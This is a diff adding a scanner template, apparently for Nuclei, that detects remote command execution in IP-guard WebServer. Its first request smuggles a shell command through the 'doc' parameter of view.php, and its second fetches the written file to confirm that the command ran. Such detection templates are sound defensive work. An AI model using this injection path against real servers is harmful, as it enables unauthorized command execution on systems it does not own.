@@ -1,0 +1,44 @@
+id: ip-guard-webserver-rce
+info:
+  name: IP-guard WebServer Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template detects a Remote Command Execution vulnerability in IP-guard WebServer by leveraging crafted paths to execute commands and verify execution through reflection.
+
+variables:
+  rand_str: "{{rand_base(16)}}"
+  file_name: "{{rand_base(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: execute-command
+    method: GET
+    path:
+      - "{{BaseURL}}/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.docx%22+%26+echo+{{rand_str}}+%3E+{{file_name}}.txt+%23&page=exp&format=pdf&callback=callback&isSplit=true"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
+
+  - id: verify-command
+    method: GET
+    path:
+      - "{{BaseURL}}/ipg/static/appr/lib/flexpaper/php/{{file_name}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand_str}}"
+        part: body
